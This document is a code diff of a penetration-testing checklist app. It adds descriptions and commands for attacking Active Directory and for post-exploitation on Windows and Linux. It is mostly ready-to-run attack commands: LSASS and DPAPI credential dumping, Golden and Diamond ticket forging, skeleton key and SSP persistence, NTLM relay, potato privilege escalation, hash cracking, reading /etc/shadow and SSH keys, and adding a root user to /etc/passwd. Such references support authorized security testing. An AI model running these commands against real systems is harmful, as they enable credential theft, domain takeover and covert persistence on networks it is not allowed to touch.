               "ESC6 @CVE@ >>> ESC1",
               "Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication",
@@ -3989,7 +5110,7 @@ const checklistPhases = [
           },
           {
             "desc": "Abuse Certificate Mapping",
-            "subdesc": "",
+            "subdesc": "ESC9/ESC10/ESC14 — abuse UPN mapping to impersonate other users via certificates",
             "cmd": [
               "ESC9/ESC10 (implicit)",
               "certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>",
@@ -4013,11 +5134,11 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__sccm",
         "name": "SCCM",
-        "description": "",
+        "description": "Exploit System Center Configuration Manager — NAA credential extraction, PXE abuse, task sequence secrets, and lateral movement via client push.",
         "commands": [
           {
             "desc": "recon",
-            "subdesc": "",
+            "subdesc": "Discover SCCM infrastructure — management points, distribution points, and site servers",
             "cmd": [
               "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
               "sccmhunter.py show -all",
@@ -4143,7 +5264,7 @@ const checklistPhases = [
           },
           {
             "desc": "Cleanup",
-            "subdesc": "",
+            "subdesc": "Remove SCCM artifacts created during exploitation",
             "cmd": [
               "SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p \"Name\" -p \"ResourceId\" -p \"SMSUniqueIdentifier",
               "SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>"
@@ -4151,7 +5272,7 @@ const checklistPhases = [
           },
           {
             "desc": "Post exploit",
-            "subdesc": "",
+            "subdesc": "Extract user session data from SCCM after gaining admin access",
             "cmd": [
               "as sccm admin",
               "SCCMHound.exe --server <server> --sitecode <sitecode>` >>> Users sessions"
@@ -4162,7 +5283,7 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__lat_move",
         "name": "Lateral Movement",
-        "description": "",
+        "description": "Move between hosts using pass-the-hash, pass-the-ticket, overpass-the-hash, WMI, WinRM, PsExec, DCOM, and RDP with stolen credentials.",
         "commands": [
           {
             "desc": "Clear text Password",
@@ -4194,7 +5315,7 @@ const checklistPhases = [
           },
           {
             "desc": "NT Hash",
-            "subdesc": "",
+            "subdesc": "NTLM hashes never expire and are not salted — reusable across sessions",
             "cmd": [
               "Pass the Hash",
               "MSSQL/PseudoShell PsExec/SMB...  >>> Admin",
@@ -4215,7 +5336,7 @@ const checklistPhases = [
           },
           {
             "desc": "Kerberos",
-            "subdesc": "",
+            "subdesc": "Pass-the-Ticket with ccache/kirbi files — convert between formats as needed",
             "cmd": [
               "Pass the Ticket (ccache / kirbi)",
               "Convert Format",
@@ -4234,7 +5355,7 @@ const checklistPhases = [
           },
           {
             "desc": "Socks (relay)",
-            "subdesc": "",
+            "subdesc": "Use proxychains with ntlmrelayx socks to pivot through relayed sessions",
             "cmd": [
               "proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids",
               "proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass` >>> MSSQL",
@@ -4246,7 +5367,7 @@ const checklistPhases = [
           },
           {
             "desc": "Certificate (pfx)",
-            "subdesc": "",
+            "subdesc": "Use stolen certificate for pass-the-cert authentication or LDAP shell access",
             "cmd": [
               "unpac the hash",
               "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
@@ -4268,7 +5389,7 @@ const checklistPhases = [
           },
           {
             "desc": "MSSQL",
-            "subdesc": "",
+            "subdesc": "Check for xp_cmdshell, impersonation, and linked servers for lateral movement",
             "cmd": [
               "find mssql access",
               "nxc mssql <ip> -u <user> -p <password> -d <domain>` >>> MSSQL",
@@ -4292,11 +5413,11 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__admin",
         "name": "Admin Access",
-        "description": "",
+        "description": "Post-admin enumeration and credential extraction — DCSync, LSASS dump, SAM/SYSTEM extraction, DPAPI secrets, and cached credentials. Key pip installs: lsassy, donpapi, dploot, masky, keepwn.",
         "commands": [
           {
             "desc": "Extract credentials from LSASS.exe",
-            "subdesc": "",
+            "subdesc": "Primary credential extraction — yields plaintext passwords, NTLM hashes, and Kerberos tickets",
             "cmd": [
               "LSASS as protected process",
               "PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 update",
@@ -4337,7 +5458,7 @@ const checklistPhases = [
           },
           {
             "desc": "Extract credentials from DPAPI",
-            "subdesc": "",
+            "subdesc": "Browser passwords, WiFi creds, and other Windows secrets protected by DPAPI",
             "cmd": [
               "DPAPI >>> User + Pass || PassTheHash || Clear text move",
               "nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]",
@@ -4357,7 +5478,7 @@ const checklistPhases = [
           },
           {
             "desc": "Impersonate",
-            "subdesc": "",
+            "subdesc": "Steal tokens from logged-on users to act as them without knowing their password",
             "cmd": [
               "Impersonate >>> ACL || User + Pass",
               "msf> use incognito impersonate_token <domain>\\\\<user>",
@@ -4375,7 +5496,7 @@ const checklistPhases = [
           },
           {
             "desc": "Misc",
-            "subdesc": "",
+            "subdesc": "User enumeration via SMB, KeePass extraction, and Azure AD-Connect DCSync",
             "cmd": [
               "Find Users >>> Username",
               "smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv",
@@ -4393,7 +5514,7 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__dom_admin",
         "name": "Domain Admin",
-        "description": "",
+        "description": "Full domain compromise actions — DCSync the entire domain, Golden/Silver ticket forging, and forest-wide credential harvesting.",
         "commands": [
           {
             "desc": "Dump ntds.dit",
@@ -4420,11 +5541,11 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__trusts",
         "name": "Trusts",
-        "description": "",
+        "description": "Enumerate and exploit domain and forest trusts — SID history injection, trust key extraction, and cross-trust Golden Tickets.",
         "commands": [
           {
             "desc": "Enumeration",
-            "subdesc": "",
+            "subdesc": "Map trust relationships between domains and forests — identify cross-trust attack paths",
             "cmd": [
               "nltest.exe /trusted_domains",
               "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",
@@ -4440,7 +5561,7 @@ const checklistPhases = [
           },
           {
             "desc": "Child->Parent",
-            "subdesc": "",
+            "subdesc": "Escalate from child domain to parent via trust key or SID history injection",
             "cmd": [
               "Trust Key >>> PassTheTicket",
               "mimikatz lsadump::trust /patch",
@@ -4458,14 +5579,14 @@ const checklistPhases = [
           },
           {
             "desc": "Parent->Child",
-            "subdesc": "",
+            "subdesc": "Same techniques as Child->Parent — trust is bidirectional",
             "cmd": [
               "same as Child to parent"
             ]
           },
           {
             "desc": "External Trust",
-            "subdesc": "",
+            "subdesc": "Exploit cross-forest or external domain trusts via password reuse, foreign group membership, or ADCS",
             "cmd": [
               "DomainA <--> DomainB trust (B trust A, A trust B)",
               "from A to B FOREST_TRANSITIVE",
@@ -4510,18 +5631,18 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__persistence",
         "name": "Persistence",
-        "description": "",
+        "description": "Maintain access in Active Directory — Golden/Silver/Diamond/Sapphire tickets, skeleton key, AdminSDHolder, DSRM, custom SSP, and SID history.",
         "commands": [
           {
             "desc": "ADD DA",
-            "subdesc": "",
+            "subdesc": "Quick persistence — add a controlled user to Domain Admins",
             "cmd": [
               "net group \"domain admins\" myuser /add /domain"
             ]
           },
           {
             "desc": "Golden ticket",
-            "subdesc": "",
+            "subdesc": "Forged TGT valid for any service — requires krbtgt hash. Survives password resets",
             "cmd": [
               "ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>",
               "mimikatz \"kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"
@@ -4529,7 +5650,7 @@ const checklistPhases = [
           },
           {
             "desc": "Silver Ticket",
-            "subdesc": "",
+            "subdesc": "Forged TGS for a specific service — requires machine account hash. No DC contact needed",
             "cmd": [
               "mimikatz \"kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt",
               "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>"
@@ -4537,21 +5658,21 @@ const checklistPhases = [
           },
           {
             "desc": "Directory Service Restore Mode (DSRM)",
-            "subdesc": "",
+            "subdesc": "Enable DSRM logon to persist as local admin on DCs — survives domain-level cleanup",
             "cmd": [
               "PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD"
             ]
           },
           {
             "desc": "Skeleton Key",
-            "subdesc": "",
+            "subdesc": "Patches LSASS on DC — any user can auth with mimikatz as password. Lost on reboot",
             "cmd": [
               "mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\" #password is mimikatz"
             ]
           },
           {
             "desc": "Custom SSP",
-            "subdesc": "",
+            "subdesc": "Logs all future logins to kiwissp.log in cleartext — stealthy credential harvesting",
             "cmd": [
               "mimikatz \"privilege::debug\" \"misc::memssp\" \"exit",
               "C:\\Windows\\System32\\kiwissp.log"
@@ -4559,7 +5680,7 @@ const checklistPhases = [
           },
           {
             "desc": "Golden certificate",
-            "subdesc": "",
+            "subdesc": "Steal CA private key to forge any certificate — ultimate ADCS persistence",
             "cmd": [
               "certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>",
               "certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>"
@@ -4567,14 +5688,14 @@ const checklistPhases = [
           },
           {
             "desc": "Diamond ticket",
-            "subdesc": "",
+            "subdesc": "Modified legitimate TGT — more realistic than Golden Ticket, harder to detect",
             "cmd": [
               "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>"
             ]
           },
           {
-            "desc": "Saphire Ticket",
-            "subdesc": "",
+            "desc": "Sapphire Ticket",
+            "subdesc": "S4U2Self + U2U combined — uses a legitimate TGT as input to forge a service ticket with arbitrary PAC. Hardest to detect.",
             "cmd": [
               "ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored"
             ]
@@ -4584,7 +5705,7 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__mitm",
         "name": "MITM / Relay",
-        "description": "",
+        "description": "Man-in-the-middle and relay attacks — NTLM relay, IPv6 DNS takeover, ARP poisoning, and WPAD abuse to capture or relay credentials.",
         "commands": [
           {
             "desc": "Listen",
@@ -4596,7 +5717,7 @@ const checklistPhases = [
           },
           {
             "desc": "NTLM relay",
-            "subdesc": "",
+            "subdesc": "Relay captured NTLM auth to LDAP, SMB, HTTP, MSSQL, or NETLOGON for privilege escalation",
             "cmd": [
               "MS08-068 self relay @CVE@",
               "msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008",
@@ -4631,7 +5752,7 @@ const checklistPhases = [
           },
           {
             "desc": "Kerberos relay",
-            "subdesc": "",
+            "subdesc": "Relay Kerberos authentication to HTTP (ADCS ESC8) or SMB/LDAP services",
             "cmd": [
               "To HTTP",
               "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>` >>> ESC8",
@@ -4646,11 +5767,11 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__crack_hash",
         "name": "Crack Hashes",
-        "description": "",
+        "description": "Offline cracking of captured AD hashes — NTLM, NTLMv2, Kerberos TGS, AS-REP, and MSCACHE2 using hashcat and john.",
         "commands": [
           {
             "desc": "LM (299bd128c1101fd6)",
-            "subdesc": "",
+            "subdesc": "Legacy LM hashes — weak, fast to crack. hashcat -m 3000",
             "cmd": [
               "john --format=lm hash.txt --wordlist=<rockyou.txt>",
               "hashcat -m 3000 -a 0 hash.txt <rockyou.txt>"
@@ -4658,7 +5779,7 @@ const checklistPhases = [
           },
           {
             "desc": "NT (b4b9b02e6f09a9bd760...)",
-            "subdesc": "",
+            "subdesc": "Standard NTLM hash — no salt, fast to crack. hashcat -m 1000",
             "cmd": [
               "john --format=nt hash.txt --wordlist=<rockyou.txt>",
               "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>"
@@ -4666,7 +5787,7 @@ const checklistPhases = [
           },
           {
             "desc": "NTLMv1 (user::85D5BC...)",
-            "subdesc": "",
+            "subdesc": "Net-NTLMv1 challenge/response — can be cracked or sent to crack.sh. hashcat -m 5500",
             "cmd": [
               "john --format=netntlm hash.txt --wordlist=<rockyou.txt>",
               "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>",
@@ -4676,7 +5797,7 @@ const checklistPhases = [
           },
           {
             "desc": "NTLMv2 (user::N46iSNek...)",
-            "subdesc": "",
+            "subdesc": "Net-NTLMv2 challenge/response — captured via Responder. hashcat -m 5600",
             "cmd": [
               "john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>",
               "hashcat -m 5600 -a 0 hash.txt <rockyou.txt>"
@@ -4684,7 +5805,7 @@ const checklistPhases = [
           },
           {
             "desc": "Kerberos 5 TGS ($krb5tgs$23$...)",
-            "subdesc": "",
+            "subdesc": "Kerberoasted service ticket — RC4 encrypted. hashcat -m 13100",
             "cmd": [
               "john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>",
               "hashcat -m 13100 -a 0 hash.txt <rockyou.txt>"
@@ -4692,35 +5813,35 @@ const checklistPhases = [
           },
           {
             "desc": "Kerberos 5 TGS AES128 ($krb5tgs$17...)",
-            "subdesc": "",
+            "subdesc": "AES-encrypted Kerberos ticket — slower to crack. hashcat -m 19600",
             "cmd": [
               "hashcat -m 19600 -a 0 hash.txt <rockyou.txt>"
             ]
           },
           {
             "desc": "Kerberos ASREP ($krb5asrep$23...)",
-            "subdesc": "",
+            "subdesc": "AS-REP roasted hash — user has pre-auth disabled. hashcat -m 18200",
             "cmd": [
               "hashcat -m 18200 -a 0 hash.txt <rockyou.txt>"
             ]
           },
           {
             "desc": "MSCache 2 (very slow) ($DCC2$10240...)",
-            "subdesc": "",
+            "subdesc": "Domain Cached Credentials v2 — 10240 PBKDF2 iterations, very slow. hashcat -m 2100",
             "cmd": [
               "hashcat -m 2100 -a 0 hash.txt <rockyou.txt>"
             ]
           },
           {
             "desc": "Timeroast hash ($sntp-ms$...)",
-            "subdesc": "",
+            "subdesc": "NTP-MS hash from computer accounts — brute-force machine passwords. hashcat -m 31300",
             "cmd": [
               "hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l"
             ]
           },
           {
             "desc": "pxe hash ($sccm$aes128$...)",
-            "subdesc": "",
+            "subdesc": "PXE boot media password hash from SCCM. hashcat -m 19850",
             "cmd": [
               "hashcat -m 19850 -a 0 hash.txt <rockyou.txt>"
             ]
@@ -4730,7 +5851,7 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__low_access",
         "name": "Low Access Privesc",
-        "description": "",
+        "description": "Windows local privilege escalation from low-privilege or service accounts. Check privileges, group memberships, service misconfigurations, and known CVEs.",
         "commands": [
           {
             "desc": "Bypass Applocker",
@@ -4748,40 +5869,146 @@ const checklistPhases = [
           },
           {
             "desc": "UAC bypass",
-            "subdesc": "Admin",
+            "subdesc": "Bypass UAC when running as admin but integrity level is Medium",
             "cmd": [
-              "Fodhelper.exe",
-              "wsreset.exe",
-              "msdt.exe"
+              "Fodhelper.exe → HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command → DelegateExecute + default value",
+              "wsreset.exe → same registry path, abuses Windows Store reset",
+              "msdt.exe → diagnostic tool, triggers elevated execution"
             ]
           },
           {
             "desc": "Auto Enum",
-            "subdesc": "Admin",
+            "subdesc": "Automated privilege escalation enumeration tools",
             "cmd": [
               "winPEASany_ofs.exe",
-              ".\\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended"
+              ".\\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended",
+              "PowerUp.ps1: powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"",
+              "Get-ModifiableServiceFile → finds services with writable binaries",
+              "Install-ServiceBinary -Name '<service>' → replaces binary with adduser payload"
             ]
           },
           {
             "desc": "Search files",
-            "subdesc": "User Account",
+            "subdesc": "Hunt for cleartext credentials in files",
             "cmd": [
-              "findstr /si 'pass' *.txt *.xml *.docx *.ini"
+              "findstr /si 'pass' *.txt *.xml *.docx *.ini",
+              "findstr /si 'password' *.config *.cfg *.log",
+              "dir /s /b *pass* *cred* *secret* 2>nul",
+              "Get-ChildItem -Path C:\\ -Include *.txt,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password'"
+            ]
+          },
+          {
+            "desc": "Server Operators Group",
+            "subdesc": "Members can modify, start/stop services → binary hijack for SYSTEM",
+            "cmd": [
+              "# Check membership: net localgroup \"Server Operators\"",
+              "# Find modifiable service:",
+              "accesschk.exe /accepteula -uwcqv \"Server Operators\" *",
+              "# Replace service binary path:",
+              "sc config <service> binpath= \"cmd /c net localgroup Administrators <user> /add\"",
+              "sc stop <service>",
+              "sc start <service>"
+            ]
+          },
+          {
+            "desc": "SeImpersonatePrivilege",
+            "subdesc": "Service accounts (IIS/MSSQL) → SYSTEM via potato attacks",
+            "cmd": [
+              "whoami /priv → check SeImpersonatePrivilege Enabled",
+              "PrintSpoofer.exe -i -c powershell.exe",
+              "JuicyPotato.exe -l 1337 -c {CLSID} -p c:\\windows\\system32\\cmd.exe -a \"/c <payload>\" -t *",
+              "GodPotato.exe -cmd \"cmd /c <payload>\"",
+              "RoguePotato.exe -r <attacker_ip> -e \"cmd /c <payload>\" -l 9999",
+              "RemotePotato0.exe -m 2 -x <attacker_ip> -p 9999 -s 1"
+            ]
+          },
+          {
+            "desc": "SeBackupPrivilege",
+            "subdesc": "Read any file on system. Extract SAM/SYSTEM or NTDS.dit for offline cracking",
+            "cmd": [
+              "whoami /priv → check SeBackupPrivilege Enabled",
+              "# Method 1 — SAM + SYSTEM dump:",
+              "reg save hklm\\sam C:\\Temp\\sam.save",
+              "reg save hklm\\system C:\\Temp\\system.save",
+              "secretsdump.py -sam sam.save -system system.save LOCAL",
+              "# Method 2 — NTDS.dit via diskshadow (DC only):",
+              "# Create script.txt: set context persistent nowriters / add volume c: alias xd / create / expose %xd% z:",
+              "diskshadow /s script.txt",
+              "robocopy /b z:\\windows\\ntds . ntds.dit",
+              "secretsdump.py -ntds ntds.dit -system system.save LOCAL"
+            ]
+          },
+          {
+            "desc": "SeTakeOwnershipPrivilege",
+            "subdesc": "Take ownership of any object → replace system binaries",
+            "cmd": [
+              "whoami /priv → check SeTakeOwnershipPrivilege Enabled",
+              "takeown /f C:\\Windows\\System32\\utilman.exe",
+              "icacls C:\\Windows\\System32\\utilman.exe /grant <user>:F",
+              "copy cmd.exe utilman.exe → trigger via lock screen Ease of Access"
+            ]
+          },
+          {
+            "desc": "SeManageVolumePrivilege",
+            "subdesc": "Write to any file via volume management → DLL hijack for SYSTEM",
+            "cmd": [
+              "whoami /priv → check SeManageVolumePrivilege Enabled",
+              "# Exploit: write malicious DLL to C:\\Windows\\System32\\spool\\drivers\\x64\\3\\",
+              "# Copy PrintNotify.dll (malicious) to that path",
+              "# Trigger SpoolSV service restart → executes DLL as SYSTEM"
+            ]
+          },
+          {
+            "desc": "SeRestorePrivilege",
+            "subdesc": "Write to any file on system → replace system binaries",
+            "cmd": [
+              "whoami /priv → check SeRestorePrivilege Enabled",
+              "# Use SeRestoreAbuse.exe to get SYSTEM shell",
+              "SeRestoreAbuse.exe \"cmd /c <payload>\""
+            ]
+          },
+          {
+            "desc": "SeDebugPrivilege",
+            "subdesc": "Debug any process → dump LSASS or inject into SYSTEM process",
+            "cmd": [
+              "whoami /priv → check SeDebugPrivilege Enabled",
+              "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+              "mimikatz # sekurlsa::minidump lsass.dmp",
+              "mimikatz # sekurlsa::logonPasswords"
             ]
           },
           {
             "desc": "Exploit",
-            "subdesc": "Admin",
+            "subdesc": "Known local privilege escalation CVEs",
             "cmd": [
               "SMBGhost CVE-2020-0796 @CVE@",
               "CVE-2021-36934 (HiveNightmare/SeriousSAM) @CVE@",
-              "vssadmin list shadows"
+              "vssadmin list shadows",
+              "PrintNightmare CVE-2021-1675 / CVE-2021-34527 @CVE@"
+            ]
+          },
+          {
+            "desc": "WSL Escalation",
+            "subdesc": "If WSL is installed, abuse it to read host files or escalate",
+            "cmd": [
+              "where /R C:\\Windows bash.exe wsl.exe",
+              "wsl whoami → check if running as root in WSL",
+              "wsl cat /etc/shadow → read host files from WSL context",
+              "wsl python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+            ]
+          },
+          {
+            "desc": "Token Impersonation (Meterpreter)",
+            "subdesc": "If meterpreter session, steal tokens from running processes",
+            "cmd": [
+              "meterpreter > load incognito",
+              "meterpreter > list_tokens -u",
+              "meterpreter > impersonate_token \"<DOMAIN>\\\\<admin_user>\""
             ]
           },
           {
             "desc": "Webdav",
-            "subdesc": "HTTP Coerce",
+            "subdesc": "HTTP Coerce → relay to attacker-controlled WebDAV",
             "cmd": [
               "open file <file>.searchConnector-ms",
               "dnstool.py -u <domain>\\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>",
@@ -4790,20 +6017,10 @@ const checklistPhases = [
           },
           {
             "desc": "Kerberos Relay",
-            "subdesc": "Admin",
+            "subdesc": "Local privilege escalation via Kerberos relay (RBCD)",
             "cmd": [
               "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>",
-              "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name>-cp <omputer_pass>"
-            ]
-          },
-          {
-            "desc": "From Service account (SEImpersonate)",
-            "subdesc": "Admin",
-            "cmd": [
-              "RoguePatato @CVE@",
-              "GodPotato @CVE@",
-              "PrintSpoofer @CVE@",
-              "RemotePotato0"
+              "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name> -cp <computer_pass>"
             ]
           }
         ]
@@ -4819,352 +6036,1126 @@ const checklistPhases = [
     "items": [
       {
         "id": "post-1",
-        "name": "Linux: Basic Enumeration",
-        "description": "Gather baseline Linux host data.",
+        "name": "Linux: User Enumeration",
+        "description": "Identify current user context, groups, history, sudo rights, and other user accounts on the system.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Current user context",
+            "subdesc": "Who are we and what can we do?",
             "cmd": [
               "whoami && id",
-              "uname -a",
-              "ip a"
+              "sudo -l",
+              "cat /etc/passwd | grep -v nologin | grep -v false",
+              "cat /etc/shadow 2>/dev/null",
+              "cat /etc/group"
+            ]
+          },
+          {
+            "desc": "User history & environment",
+            "subdesc": "Check command history and environment variables for creds",
+            "cmd": [
+              "history",
+              "cat ~/.bash_history",
+              "cat ~/.zsh_history 2>/dev/null",
+              "env",
+              "echo $PATH"
+            ]
+          },
+          {
+            "desc": "Home directory secrets",
+            "subdesc": "SSH keys, config files, dotfiles",
+            "cmd": [
+              "find /home -type f -name '*.txt' -o -name '*.conf' -o -name '*.bak' -o -name '.bash_history' 2>/dev/null",
+              "find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'authorized_keys' 2>/dev/null",
+              "cat ~/.ssh/id_rsa 2>/dev/null",
+              "cat ~/.ssh/authorized_keys 2>/dev/null"
+            ]
+          },
+          {
+            "desc": "Writable directories & files",
+            "subdesc": "Find world-writable paths for staging payloads or abuse",
+            "cmd": [
+              "find / -writable -type d 2>/dev/null",
+              "find / -writable -type f 2>/dev/null | grep -v proc"
             ]
           }
         ]
       },
       {
         "id": "post-2",
-        "name": "Linux: Run LinPEAS",
-        "description": "Automated Linux privesc checks.",
+        "name": "Linux: System Enumeration",
+        "description": "Identify OS version, kernel, architecture and installed packages for exploit matching.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "System identification",
+            "subdesc": "OS, kernel, architecture",
             "cmd": [
-              "wget http://<LHOST>/linpeas.sh -O /tmp/linpeas.sh",
-              "chmod +x /tmp/linpeas.sh"
+              "hostname",
+              "uname -a",
+              "cat /etc/os-release",
+              "cat /etc/issue",
+              "cat /proc/version",
+              "lscpu",
+              "df -h"
+            ]
+          },
+          {
+            "desc": "Installed packages",
+            "subdesc": "Find installed software for known vulnerable versions",
+            "cmd": [
+              "dpkg -l 2>/dev/null",
+              "rpm -qa 2>/dev/null",
+              "apt list --installed 2>/dev/null"
             ]
           }
         ]
       },
       {
         "id": "post-3",
-        "name": "Linux: Sudo Permissions",
-        "description": "Assess sudo abuse opportunities.",
+        "name": "Linux: Network Enumeration",
+        "description": "Discover internal network topology, listening services, routes, and pivot opportunities.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Network interfaces & routing",
+            "subdesc": "Interfaces, IPs, routes, ARP table",
             "cmd": [
-              "sudo -l"
+              "ip a",
+              "ip route",
+              "arp -a",
+              "cat /etc/resolv.conf",
+              "cat /etc/hosts"
+            ]
+          },
+          {
+            "desc": "Listening services & connections",
+            "subdesc": "Internal services that may be exploitable or pivotable",
+            "cmd": [
+              "ss -tulpn",
+              "netstat -ano 2>/dev/null",
+              "ss -anp | grep LISTEN"
+            ]
+          },
+          {
+            "desc": "Firewall rules",
+            "subdesc": "Check iptables/nftables rules",
+            "cmd": [
+              "iptables -L -n 2>/dev/null",
+              "cat /etc/iptables/rules.v4 2>/dev/null",
+              "nft list ruleset 2>/dev/null"
             ]
           }
         ]
       },
       {
         "id": "post-4",
-        "name": "Linux: SUID/SGID Binaries",
-        "description": "Identify SUID/SGID escalation vectors.",
+        "name": "Linux: Service Enumeration",
+        "description": "Enumerate running services, mounted filesystems, loaded modules, and writable systemd units.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Running services",
+            "subdesc": "Active services and daemons",
             "cmd": [
-              "find / -perm -4000 -type f 2>/dev/null"
+              "service --status-all 2>/dev/null",
+              "systemctl list-units --type=service --state=running",
+              "ps aux | grep root"
+            ]
+          },
+          {
+            "desc": "Filesystems & mounts",
+            "subdesc": "Mounted filesystems, fstab, block devices",
+            "cmd": [
+              "cat /etc/fstab",
+              "mount",
+              "lsblk",
+              "lsmod"
+            ]
+          },
+          {
+            "desc": "Writable systemd unit files",
+            "subdesc": "If you can modify a unit file running as root → code execution",
+            "cmd": [
+              "find /etc/systemd/system -writable -type f 2>/dev/null",
+              "find /lib/systemd/system -writable -type f 2>/dev/null"
             ]
           }
         ]
       },
       {
         "id": "post-5",
-        "name": "Linux: Capabilities",
-        "description": "Check capability-based privilege paths.",
+        "name": "Linux: Sudo Permissions",
+        "description": "Assess sudo misconfigurations. Check GTFOBins for exploitable binaries.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Check sudo rights",
+            "subdesc": "GTFOBins: https://gtfobins.github.io/",
             "cmd": [
-              "getcap -r / 2>/dev/null"
+              "sudo -l",
+              "# Check each binary against GTFOBins for shell escape",
+              "# Common abusable: vim, find, nmap, python, perl, ruby, less, awk, man, ftp"
+            ]
+          },
+          {
+            "desc": "Sudo version exploits",
+            "subdesc": "Check for vulnerable sudo version",
+            "cmd": [
+              "sudo --version",
+              "# CVE-2021-3156 (Baron Samedit): sudo < 1.9.5p2 → heap overflow",
+              "# CVE-2019-14287: sudo -u#-1 /bin/bash → when (ALL, !root) is set"
             ]
           }
         ]
       },
       {
         "id": "post-6",
-        "name": "Linux: Cron Jobs",
-        "description": "Scheduled task discovery.",
+        "name": "Linux: SUID/SGID Binaries",
+        "description": "Find SUID/SGID binaries and cross-reference with GTFOBins for privilege escalation.",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Find SUID binaries",
+            "subdesc": "Binaries that run as the file owner (usually root)",
             "cmd": [
-              "crontab -l",
-              "cat /etc/crontab"
+              "find / -type f -perm -u=s 2>/dev/null",
+              "find / -type f -perm -g=s 2>/dev/null",
+              "find / -type f \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null"
+            ]
+          },
+          {
+            "desc": "Writable /etc files",
+            "subdesc": "If /etc/passwd is writable → add root user",
+            "cmd": [
+              "find /etc -writable -type f 2>/dev/null",
+              "# If /etc/passwd writable:",
+              "openssl passwd -1 -salt xyz password123",
+              "echo 'hacker:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd"
             ]
           }
         ]
       },
       {
         "id": "post-7",
-        "name": "Linux: Writable Files & Dirs",
-        "description": "Writable paths for escalation.",
+        "name": "Linux: Capabilities",
+        "description": "Check Linux capabilities that can be abused for privilege escalation (e.g., cap_setuid on python/perl).",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "Enumerate capabilities",
+            "subdesc": "Capabilities allow fine-grained root powers on individual binaries",
             "cmd": [
-              "find / -writable -type f 2>/dev/null"
+              "getcap -r / 2>/dev/null"
+            ]
+          },
+          {
+            "desc": "Abuse cap_setuid (python example)",
+            "subdesc": "If python has cap_setuid → instant root",
+            "cmd": [
+              "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+              "# perl: perl -e 'use POSIX; setuid(0); exec \"/bin/bash\";'",
+              "# Also check: cap_dac_read_search (read any file), cap_net_raw, cap_sys_admin"
             ]
           }
         ]
       },
       {
         "id": "post-8",
-        "name": "Linux: Network & Internal Services",
-        "description": "Internal pivots and services.",
